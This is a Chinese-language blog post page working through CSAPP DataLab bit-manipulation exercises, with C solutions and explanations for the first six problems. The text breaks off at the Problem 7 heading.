<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="1. DataLabDirectoryLayout: 12345678910111213141516171819.├── bits.c├── bits.h├── bits.p.c├── btest├── btest.c├── btest.h├── cat├── decl.c├── dlc├── Driverhdrs.pm├── Driverlib.pm├── driver.pl├── echo├─">
<meta property="og:type" content="article">
<meta property="og:title" content="CSAPP_Labs">
<meta property="og:url" content="http://www.hzrr.com/2023/12/11/CSAPP-Labs/index.html">
<meta property="og:site_name" content="HzRr&#39;s Blog">
<meta property="og:description" content="1. DataLabDirectoryLayout: 12345678910111213141516171819.├── bits.c├── bits.h├── bits.p.c├── btest├── btest.c├── btest.h├── cat├── decl.c├── dlc├── Driverhdrs.pm├── Driverlib.pm├── driver.pl├── echo├─">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-12-11T08:12:40.000Z">
<meta property="article:modified_time" content="2024-02-29T06:03:04.899Z">
<meta property="article:author" content="HzRr">
<meta property="article:tag" content="csapp">
<meta property="article:tag" content="labs">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CSAPP_Labs</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="HzRr&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/hzrr">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/01/24/CPython%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2023/11/30/CSAPP-Note/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://www.hzrr.com/2023/12/11/CSAPP-Labs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&text=CSAPP_Labs"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&is_video=false&description=CSAPP_Labs"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CSAPP_Labs&body=Check out this article: http://www.hzrr.com/2023/12/11/CSAPP-Labs/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&name=CSAPP_Labs&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&t=CSAPP_Labs"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-DataLab"><span class="toc-number">1.</span> <span class="toc-text">1. DataLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-1"><span class="toc-number">1.1.</span> <span class="toc-text">Problem 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-2"><span class="toc-number">1.2.</span> <span class="toc-text">Problem 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-3"><span class="toc-number">1.3.</span> <span class="toc-text">Problem 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-4"><span class="toc-number">1.4.</span> <span class="toc-text">Problem 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-5"><span class="toc-number">1.5.</span> <span class="toc-text">Problem 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-6"><span class="toc-number">1.6.</span> <span class="toc-text">Problem 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-7"><span class="toc-number">1.7.</span> <span class="toc-text">Problem 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-8"><span class="toc-number">1.8.</span> <span class="toc-text">Problem 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-9"><span class="toc-number">1.9.</span> <span class="toc-text">Problem 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-10"><span class="toc-number">1.10.</span> <span class="toc-text">Problem 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-11"><span class="toc-number">1.11.</span> <span class="toc-text">Problem 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-12"><span class="toc-number">1.12.</span> <span class="toc-text">Problem 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-13"><span class="toc-number">1.13.</span> <span class="toc-text">Problem 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-14"><span class="toc-number">1.14.</span> <span class="toc-text">Problem 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summarize"><span class="toc-number">1.15.</span> <span class="toc-text">Summarize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-BombLab"><span class="toc-number">2.</span> <span class="toc-text">2. BombLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-1"><span class="toc-number">2.1.</span> <span class="toc-text">Phase-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer"><span class="toc-number">2.1.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-2"><span class="toc-number">2.2.</span> <span class="toc-text">Phase-2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-3"><span class="toc-number">2.3.</span> <span class="toc-text">Phase-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-4"><span class="toc-number">2.4.</span> <span class="toc-text">Phase-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-5"><span class="toc-number">2.5.</span> <span class="toc-text">Phase-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-4"><span class="toc-number">2.5.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-6"><span class="toc-number">2.6.</span> <span class="toc-text">Phase-6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-5"><span class="toc-number">2.6.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summarize-1"><span class="toc-number">2.7.</span> <span class="toc-text">Summarize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-AttackLab"><span class="toc-number">3.</span> <span class="toc-text">3. AttackLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-1-1"><span class="toc-number">3.1.</span> <span class="toc-text">Phase-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-6"><span class="toc-number">3.1.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-2-1"><span class="toc-number">3.2.</span> <span class="toc-text">Phase-2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-7"><span class="toc-number">3.2.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-3-1"><span class="toc-number">3.3.</span> <span class="toc-text">Phase-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-8"><span class="toc-number">3.3.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-4-1"><span class="toc-number">3.4.</span> <span class="toc-text">Phase-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-9"><span class="toc-number">3.4.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-5-1"><span class="toc-number">3.5.</span> <span class="toc-text">Phase-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-10"><span class="toc-number">3.5.1.</span> <span class="toc-text">Answer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-ArchitectureLab"><span class="toc-number">4.</span> <span class="toc-text">4. ArchitectureLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-A"><span class="toc-number">4.1.</span> <span class="toc-text">Part A</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-sum-list"><span class="toc-number">4.1.1.</span> <span class="toc-text">Function sum_list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-rsum-list"><span class="toc-number">4.1.2.</span> <span class="toc-text">Function rsum_list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-copy-block"><span class="toc-number">4.1.3.</span> <span class="toc-text">Function copy_block</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-B"><span class="toc-number">4.2.</span> <span class="toc-text">Part B</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-C"><span class="toc-number">4.3.</span> <span class="toc-text">Part C</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5"><span class="toc-number">5.</span> <span class="toc-text">5.</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CSAPP_Labs
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">HzRr</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-11T08:12:40.000Z" class="dt-published" itemprop="datePublished">2023-12-11</time>
        
        (Updated: <time datetime="2024-02-29T06:03:04.899Z" class="dt-updated" itemprop="dateModified">2024-02-29</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/csapp/" rel="tag">csapp</a>, <a class="p-category" href="/tags/labs/" rel="tag">labs</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="1-DataLab"><a href="#1-DataLab" class="headerlink" title="1. DataLab"></a>1. DataLab</h1><p><strong>DirectoryLayout:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bits.c</span><br><span class="line">├── bits.h</span><br><span class="line">├── bits.p.c</span><br><span class="line">├── btest</span><br><span class="line">├── btest.c</span><br><span class="line">├── btest.h</span><br><span class="line">├── cat</span><br><span class="line">├── decl.c</span><br><span class="line">├── dlc</span><br><span class="line">├── Driverhdrs.pm</span><br><span class="line">├── Driverlib.pm</span><br><span class="line">├── driver.pl</span><br><span class="line">├── echo</span><br><span class="line">├── fshow.c</span><br><span class="line">├── ishow.c</span><br><span class="line">├── Makefile</span><br><span class="line">├── README</span><br><span class="line">└── tests.c</span><br></pre></td></tr></table></figure>



<h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem 1"></a>Problem 1</h2><p><strong>Code</strong>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitAnd - x&amp;y using only ~ and | </span></span><br><span class="line"><span class="comment"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ |</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitAnd</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> ~((~x) | (~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong></p>
<p>x &amp; y 即 ~(~x | ~y)</p>
<h2 id="Problem-2"><a href="#Problem-2" class="headerlink" title="Problem 2"></a>Problem 2</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * getByte - Extract byte n from word x</span></span><br><span class="line"><span class="comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class="line"><span class="comment"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 6</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getByte</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> shift_bits = n &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> mask = <span class="number">0xff</span> &lt;&lt; shift_bits;</span><br><span class="line">        <span class="keyword">return</span> ((x &amp; mask) &gt;&gt; shift_bits) &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>利用掩码获取指定字节的值，注意C的右移运算符<code>&gt;&gt;</code>是算术右移，若x为负数，在成功获取到对应字节值后仍需要与<code>0xff</code>进行一次按位与操作，以消除高位的1. </p>
<h2 id="Problem-3"><a href="#Problem-3" class="headerlink" title="Problem 3"></a>Problem 3</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class="line"><span class="comment"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 3 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalShift</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> sign_num = (<span class="number">0x1</span> &lt;&lt; <span class="number">31</span>) &amp; x;</span><br><span class="line">        <span class="keyword">return</span> (x &gt;&gt; n) ^ ((sign_num &gt;&gt; n) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>要实现逻辑右移，首先得获取符号位，通过<code>(0x1 &lt;&lt; 31) &amp; x</code>获取到x的符号位后，对x进行算术右移(<code>x &gt;&gt; n</code>)，并将结果与高n位填充为符号位(<code>((sign_num &gt;&gt; n) &lt;&lt; 1)</code>)进行按位与运算即可得到逻辑右移的结果。</p>
<h2 id="Problem-4"><a href="#Problem-4" class="headerlink" title="Problem 4"></a>Problem 4</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitCount - returns count of number of 1&#x27;s in word</span></span><br><span class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 40</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitCount</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="comment">// int mask1 = (0x55 &lt;&lt; 24) | (0x55 &lt;&lt; 16) | (0x55 &lt;&lt; 8) | 0x55;</span></span><br><span class="line">        <span class="comment">// int mask2 = (0x33 &lt;&lt; 24) | (0x33 &lt;&lt; 16) | (0x33 &lt;&lt; 8) | 0x33;</span></span><br><span class="line">        <span class="comment">// int mask3 = (0x0F &lt;&lt; 24) | (0x0F &lt;&lt; 16) | (0x0F &lt;&lt; 8) | 0x0F;</span></span><br><span class="line">        <span class="comment">// int mask4 = (0xFF &lt;&lt; 16) | 0xFF;</span></span><br><span class="line">        <span class="comment">// int mask5 = (0xFF &lt;&lt; 8 ) | 0xFF;</span></span><br><span class="line">        <span class="type">int</span> _mask1 = (<span class="number">0x55</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x55</span>;</span><br><span class="line">        <span class="type">int</span> _mask2 = (<span class="number">0x33</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x33</span>;</span><br><span class="line">        <span class="type">int</span> _mask3 = (<span class="number">0x0F</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x0F</span>;</span><br><span class="line">        <span class="type">int</span> mask1 = (_mask1 &lt;&lt; <span class="number">16</span>) | _mask1;</span><br><span class="line">        <span class="type">int</span> mask2 = (_mask2 &lt;&lt; <span class="number">16</span>) | _mask2;</span><br><span class="line">        <span class="type">int</span> mask3 = (_mask3 &lt;&lt; <span class="number">16</span>) | _mask3;</span><br><span class="line">        <span class="type">int</span> mask4 = (<span class="number">0xFF</span> &lt;&lt; <span class="number">16</span>) | <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">int</span> mask5 = (<span class="number">0xFF</span> &lt;&lt; <span class="number">8</span> ) | <span class="number">0xFF</span>;</span><br><span class="line">        </span><br><span class="line">        x = (x &amp; mask1) + ((x &gt;&gt; <span class="number">1</span> ) &amp; mask1);</span><br><span class="line">        x = (x &amp; mask2) + ((x &gt;&gt; <span class="number">2</span> ) &amp; mask2);</span><br><span class="line">        x = (x &amp; mask3) + ((x &gt;&gt; <span class="number">4</span> ) &amp; mask3);</span><br><span class="line">        x = (x &amp; mask4) + ((x &gt;&gt; <span class="number">8</span> ) &amp; mask4);</span><br><span class="line">        x = (x &amp; mask5) + ((x &gt;&gt; <span class="number">16</span>) &amp; mask5);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong> </p>
<table>
<thead>
<tr>
<th>十六进制</th>
<th>二进制</th>
</tr>
</thead>
<tbody><tr>
<td>0x55555555</td>
<td>01010101010101010101010101010101</td>
</tr>
<tr>
<td>0x33333333</td>
<td>00110011001100110011001100110011</td>
</tr>
<tr>
<td>0x0F0F0F0F</td>
<td>00001111000011110000111100001111</td>
</tr>
<tr>
<td>0x00FF00FF</td>
<td>00000000111111110000000011111111</td>
</tr>
<tr>
<td>0x0000FFFF</td>
<td>00000000000000001111111111111111</td>
</tr>
</tbody></table>
<p>在统计每个x的二进制位有多少个1时，使用了上述五个掩码(mask), 这五个掩码的二进制值是按照 ** 01 -&gt; 0011 -&gt; 00001111 -&gt; 0000000011111111 -&gt; 00000000000000001111111111111111** 的规律变化的，而偏移量(shift)的值也与1的数目相关 <strong>1 -&gt; 2 -&gt; 4 -&gt; 8 -&gt; 16</strong></p>
<p>而根据表达式 x &#x3D; (x &amp; mask[i])+ ((x &gt;&gt; shift) &amp; mask[i]); 可以看出： 第一次是计算每两位的和并储存在两个bit内, 第二次是计算每四位的和并储存在4个bit内……以此类推，最后计算每32位(即x)的和并储存在32个bit内(即x所在内存块)，由于是二进制表示，32位的和就是1的个数。</p>
<p><strong>ps:</strong> 这里要注意<code>Max ops</code>，如果用注释掉的部分的代码，会超出2个ops.</p>
<h2 id="Problem-5"><a href="#Problem-5" class="headerlink" title="Problem 5"></a>Problem 5</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bang - Compute !x without using !</span></span><br><span class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        x = (x &gt;&gt; <span class="number">16</span>) | x;</span><br><span class="line">        x = (x &gt;&gt; <span class="number">8</span> ) | x;</span><br><span class="line">        x = (x &gt;&gt; <span class="number">4</span> ) | x;</span><br><span class="line">        x = (x &gt;&gt; <span class="number">2</span> ) | x;</span><br><span class="line">        x = (x &gt;&gt; <span class="number">1</span> ) | x;</span><br><span class="line">        <span class="keyword">return</span> (~x &amp; <span class="number">0x1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>若x为真，即其二进制形式中存在1,则经过五次<code>x = (x &gt;&gt; shift) | x</code>运算后，其最低位一定为1,反之为0,再通过<code>(~x &amp; 0x1)</code>拿到对应的相反的值。</p>
<h2 id="Problem-6"><a href="#Problem-6" class="headerlink" title="Problem 6"></a>Problem 6</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>32位有符号int型的最小值为0x80000000.</p>
<h2 id="Problem-7"><a href="#Problem-7" class="headerlink" title="Problem 7"></a>Problem 7</h2><p><strong>Code:</strong> </p>
